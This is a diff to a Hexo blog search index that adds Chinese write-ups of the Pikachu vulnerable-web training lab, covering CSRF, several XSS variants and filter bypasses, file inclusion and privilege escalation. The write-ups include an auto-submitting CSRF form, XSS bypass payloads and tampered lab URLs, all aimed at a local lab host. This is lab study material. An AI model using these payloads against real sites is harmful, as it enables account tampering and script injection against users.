@@ -1,22 +1,814 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/posts/16107.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>CSRF</title>
+    <url>/posts/1881.html</url>
+    <content><![CDATA[<p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
+<h1 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h1><p>看一下提示，可以得到很多的用户与密码，这里以 vince 账户为实验。</p>
+<p><img src="/../../img/docs/pikachu/CSRF/1738227041639-4fd10312-e15a-4a7d-99b0-825ec893a3b6.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">姓名:vince</span><br><span class="line">性别:boy</span><br><span class="line">手机:<span class="number">18626545453</span></span><br><span class="line">住址:chain</span><br><span class="line">邮箱:vince@pikachu.com</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p><img src="/../../img/docs/pikachu/CSRF/1738227135473-867932c7-ce88-4729-bbac-e290b62a7b19.png"></p>
+<p>将邮箱修改成 <a href="mailto:&#109;&#x6f;&#x76;&#64;&#x70;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#x2e;&#99;&#x6f;&#109;">mov@pikachu.com</a> 了。</p>
+<p>不过没看到它在 URL 有显示 GET 获取的数据罢了。</p>
+<p>我们看一下浏览器中表单中各个组件的 name 值</p>
+<p><img src="/../../img/docs/pikachu/CSRF/1738241890213-eb70ddd3-a33a-41a8-bd61-bb3ab34ee2dd.png"></p>
+<p>我们简单构造一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?sex=boy&amp;phonenum=<span class="number">18626545453</span>&amp;add=chain&amp;email=mrvirus@qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>发现没有用。那我老老实实用 Burpsuite 去抓包看看有什么缺的。</p>
+<p>**tips：**其实少写一个 submit 那个发送按键，因为 value 为 submit，所以后面再加一个 submit&#x3D;submit。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=<span class="number">18626545453</span>&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.17</span><span class="number">.129</span>:<span class="number">8000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">134.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">134.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.17</span><span class="number">.129</span>:<span class="number">8000</span>/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">Cookie: PHPSESSID=o10dqkebdm0tkdfss0ah7epkf6</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>OK，我们发现，我们还少了一个 submit&#x3D;submit</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?sex=boy&amp;phonenum=<span class="number">18626545453</span>&amp;add=chain&amp;email=mrvirus@qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>OK，修改成功！</p>
+<p><img src="/../../img/docs/pikachu/CSRF/1738242314800-d927514d-db8b-4245-a734-d50507e0f7c2.png"></p>
+<p>借他人在浏览器留下的 cookie（session），以达成点击链接修改用户信息的方法。</p>
+<h1 id="CSRF-POST-CSRF-token"><a href="#CSRF-POST-CSRF-token" class="headerlink" title="CSRF(POST)&#x3D;&gt;CSRF token"></a>CSRF(POST)&#x3D;&gt;CSRF token</h1><p>POST 当然先抓包</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sex=boy&amp;phonenum=<span class="number">18626545453</span>&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>我们当然可以放到 intruder 中进行发送。但是这有什么用，又不是攻击自己。所以这个我们一般就会制作一个钓鱼网站，一个 HTML 网页即可，放一个表单，请求方式为 POST 请求，只要有人打开网页，点击按钮，就可以进行 POST 请求。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Official&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://192.168.17.129:8000/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;sex&quot;</span> value=<span class="string">&quot;boy&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;phonenum&quot;</span> value=<span class="string">&quot;18626545453&quot;</span>/&gt;    </span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;add&quot;</span> value=<span class="string">&quot;chain&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;mov@pikachu.com&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/CSRF/1738243575077-eb919f64-8fb7-4707-b102-a8a134f9d4e5.png"></p>
+<p>ok，点击 submit，也可以修改。但是我们发送给其他用户这个钓鱼网站，别人也不信啊，所以还需要用到 js 代码进行自动化。</p>
+<p>可以用到 js 的模拟点击，我们只需要给按钮给上 ID 编号即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">document.getElementById(<span class="string">&#x27;myButton&#x27;</span>).click();</span><br></pre></td></tr></table></figure>
+
+<p>写上代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Official&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://192.168.17.129:8000/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;sex&quot;</span> value=<span class="string">&quot;boy&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;phonenum&quot;</span> value=<span class="string">&quot;18626545453&quot;</span>/&gt;    </span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;add&quot;</span> value=<span class="string">&quot;chain&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span> value=<span class="string">&quot;vince@pikachu.com&quot;</span>/&gt;</span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;ok&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        document.getElementById(<span class="string">&quot;ok&quot;</span>).click();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ok，有效。</p>
+<p>**问题：**为什么不管是 GET 构造还是 POST 构造，第一次都会导致浏览器失去 cookie 信息，第二次才能成功？</p>
+<p>浏览器对策？</p>
 ]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Croos-Site Scripting</title>
+    <url>/posts/4946.html</url>
+    <content><![CDATA[<p>XSS（跨站脚本）一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
+<p><strong>类型：</strong></p>
+<ol>
+<li>反射型 XSS</li>
+<li>存储型 XSS</li>
+<li>DOM 型 XSS</li>
+</ol>
+<h1 id="反射型-XSS（GET）"><a href="#反射型-XSS（GET）" class="headerlink" title="反射型 XSS（GET）"></a>反射型 XSS（GET）</h1><p>有输入框我们就可以试试一些 js 代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入进去，我们可以看到，前端限制了长度</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115493543-f811ab67-e8fd-4a17-9351-274a87084f7e.png)</p>
+<p>这个简单，这种就是用了 HTML 的语法限制。我们浏览器调试一下。把 maxlength 改成 100 甚至更大。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115566615-70db18d3-bf0b-40b6-9c2f-f0fc37af980d.png)</p>
+<p>解决</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115609972-2894658c-07c4-4a89-910d-2e61293bc95b.png)</p>
+<p>这个题目有一个 GET，就是通过 URL 进行传输信息。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738115661840-64b8c2a5-b075-4fac-b73a-41f33808ac7e.png)</p>
+<p>说明我们不仅可以通过修改 HTML 语法进行绕过，还可以通过修改 URL 进行绕过。</p>
+<p><strong>方法</strong></p>
+<ol>
+<li>修改 HTML</li>
+<li>修改 URL</li>
+</ol>
+<h1 id="反射型-XSS（POST）"><a href="#反射型-XSS（POST）" class="headerlink" title="反射型 XSS（POST）"></a>反射型 XSS（POST）</h1><p>先看一下提示，我们获得了一个账号。</p>
+<p>我们进去之后，可以输入那串 js 代码即可。</p>
+<h1 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h1><p>看到一个文本框，老规矩，先输入我们的 js 代码。</p>
+<p>ok 可以。</p>
+<p>并且每次刷新也不会消失。</p>
+<h1 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h1><p>可以看到，这次简单输入 js 代码不行了。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738116717155-c0753f89-9fbf-45f4-82b6-51ec297be670.png)</p>
+<p>我们通过浏览器调试查看一下代码。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738116781991-38f768d0-cc5a-4804-b13c-524827fb5671.png)</p>
+<p>可以看到有一个 id 为 dom 的 div 框，里面将输入框里的文字放到了 href 里，就成了超链接。</p>
+<p><strong>解决办法</strong></p>
+<p>我们可以将 href 进行封闭，我们想要的的是：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&quot;</span>&gt;&lt;/a&gt;&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之类的，我们再看看代码发现有一个 onclick&#x3D;”domxss()”</p>
+<p>我们进行搜索，可以发现函数</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+
+<p>最重要的是</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>失败案例</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看一下浏览器解析的，也没错，怎么没有弹窗？</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738118925608-ce04428f-cede-4581-82ee-30d7f03b4861.png)</p>
+<p>当我们点击按钮时，发现我们的浏览器并没有刷新，自然 js 代码也不会被执行。</p>
+<p><strong>成功案例</strong></p>
+<p>我们需要写一些可以手动激活 alert 的 HTML 代码。比如 onlick 或者鼠标操作。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(1)&quot;&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们点击超链接，我们就手动激活了事件。成功！</p>
+<h1 id="DOM-型-XSS-X"><a href="#DOM-型-XSS-X" class="headerlink" title="DOM 型 XSS-X"></a>DOM 型 XSS-X</h1><p>这个一样用上面的</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(1)&quot;&gt;&lt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个通过 GET 请求到 URL 上，然后通过 javascript 获取 URL 的 text 数据，最后放在超连接中。</p>
+<h1 id="XSS-之盲打"><a href="#XSS-之盲打" class="headerlink" title="XSS 之盲打"></a>XSS 之盲打</h1><p>我们这次通过输入普通字符和一般的 js 代码都不会输出字符或者跳出弹窗。浏览器调用发现表单是 POST 请求的，没啥信息。看看提示，有一个后端。</p>
+<p>进入，之后就有弹窗了。空白处就是弹窗的字符。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738120952175-91bed87b-ee45-410b-8951-45cf8c298ab3.png)</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Croos-Site Scripting&#x2F;1738120993607-967c3cbc-a299-435f-8027-42fad0568325.png)</p>
+<p>**原理：**通过 POST 请求保存在服务器上，可以在工作人员打开后端时执行 xss 代码。</p>
+<h1 id="XSS-之过滤"><a href="#XSS-之过滤" class="headerlink" title="XSS 之过滤"></a>XSS 之过滤</h1><p>输入 1 是这样的</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">别说这些<span class="string">&#x27;1&#x27;</span>的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>
+
+<p>输入&lt;</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">别说这些<span class="string">&#x27;&lt;&#x27;</span>的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>
+
+<p>输入&lt;script</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">别说这些<span class="string">&#x27;&#x27;</span>的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>
+
+<p>输入script&gt;</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">别说这些<span class="string">&#x27;script&gt;&#x27;</span>的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，如果&lt;script 的话，就会进行过滤。</p>
+<p><strong>方法 1：不用 JS</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/p&gt;&quot;&lt;a href=&quot;#&quot; onclick=&quot;alert(1)&quot;&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接通过 DOM XSS 那章的知识进行绕过。</p>
+<p><strong>方法 2：使用 JS</strong></p>
+<p>使用 JS 那一般都需要 <script>了，但是被绕过了。我们可以看看源码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>看到它只匹配了 &lt;script（中间不限字数），我们就可以使用 script 的大写进行绕过。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;SCRIPT&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&quot;hello&quot;</span>);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-之-htmlspecialchars"><a href="#XSS-之-htmlspecialchars" class="headerlink" title="XSS 之 htmlspecialchars"></a>XSS 之 htmlspecialchars</h1><p>这里提到了 htmlspecialchars，这个是 php 的一个函数，可以消去一些 html 的特殊字符的一个函数，起到安全的作用。</p>
+<p>可以参考：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a></p>
+<p>然后我们看看源码：</p>
+<p><a href="1">1</a></p>
+<p>默认的是 ENT_COMPAT，这个就仅编码双引号了。而这里就是默认的，我们可以通过单引号进行绕过。</p>
+<p>我们输入 1</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们尝试通过单引号进行构造</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>就直接构造出了</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>&#x27;onclick=&#x27;alert(1)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-之-href-输出"><a href="#XSS-之-href-输出" class="headerlink" title="XSS 之 href 输出"></a>XSS 之 href 输出</h1><p>输入正常的一个 URL</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>可以跳转到 <a href="http://www.baidu.com/">www.baidu.com</a> 这个网站，而输入上面的&#39;onlick=&#39;alert(1)则不行了。发现双引号和单引号都应该被转义了，单引号不能强行和双引号进行匹配了。</p>
+<p>既然可以进行跳转网站，浏览器有一个可以运行 js 代码的方法，就是在输入框前面输入 javascript:即可。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-之-js-输出"><a href="#XSS-之-js-输出" class="headerlink" title="XSS 之 js 输出"></a>XSS 之 js 输出</h1><p>JS 同样可以和 HTML 一样从字符串中进行语法闭合。PHP、MySQL 也有时一样。</p>
+<p>构造的入手点</p>
+<p>![](../../img/docs/pikachu/Croos-Site Scripting/1738131404805-fe8bab00-bdd1-4b97-90ef-f1a4267f3b65.png)</p>
+<p>将<script>进行闭合，在构造自己的事件。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>File Inclusion</title>
+    <url>/posts/51912.html</url>
+    <content><![CDATA[<p><strong>文件包含漏洞</strong></p>
+<ol>
+<li><strong>本地文件包含漏洞</strong></li>
+<li><strong>远程文件包含漏洞</strong></li>
+</ol>
+<p>include、include_once、require、require_once</p>
+<p><strong>include 和 requrie 的区别</strong></p>
+<p>include 包含有错误还会继续运行，而 require 会中止。</p>
+<p><strong>xxx 和 xxx_once 的区别</strong></p>
+<p>once 只会运行一次</p>
+<p>下面的 local 和 remote 的区别就是，看一下代码</p>
+<p>local 的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>remote 的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 local 的代码明显自由度不高，被 include&#x2F;限制了，但是我们可以用.. .这样的符号在本地内 include。</p>
+<p>remote 不仅可以在本地，还可以用 URL 引用互联网上的 php 以及其他的文件。</p>
+<h1 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h1><h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1>]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Over Permisson</title>
+    <url>/posts/687.html</url>
+    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>我们输入 kobe 的账号密码，进入进去，查看个人资料，我们发现 URL 上面的信息，我们可以尝试改成其他用户名(lucy&#x2F;lili&#x2F;kobe)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%<span class="number">82</span>%B9%E5%<span class="number">87</span>%BB%E6%<span class="number">9</span>F%A5%E7%<span class="number">9</span>C%<span class="number">8</span>B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%<span class="number">81</span>%AF</span><br></pre></td></tr></table></figure>
+
+<p>发现改成 lucy 的，在 kobe 页面也可以看到 lucy 的个人信息，这就是水平越权漏洞了。同样的可以看到 lili 的信息。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Over Permisson&#x2F;1738553620437-17c0ab66-0230-4549-a5eb-478576d1e285.png)</p>
+<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>提供了 admin&#x2F;123456、pikachu&#x2F;000000，还说明了 admin 是超级用户，我们登录 admin 账号试试。同样的我们发现了添加用户和删除用户的 URL，我们就登录看 pikachu 这个账户看能不能利用即可。</p>
+<p>添加用户的 URL</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
+
+<p>删除用户的 URL 之一</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>发现添加用户的 URL 在 pikachu 中可以进去。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Over Permisson&#x2F;1738554015974-aad2bdd0-7499-473b-9e7d-6f206391ce35.png)</p>
+<p>我们通过 admin 可以看到 hhh 的 id 为 28。我们再切换到 pikachu 去删除它，发现 pikachu 没有删除的权限。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">28</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>/posts/17013.html</url>
+    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化  serialize()"></a>序列化  serialize()</h2><p>把一个对象变成可以传输的字符串</p>
+<h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>把被序列化的字符串还原成对象</p>
+<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>一开局就然我们输入一个序列化数据，不知道想干啥，我们就随便写一个对象</p>
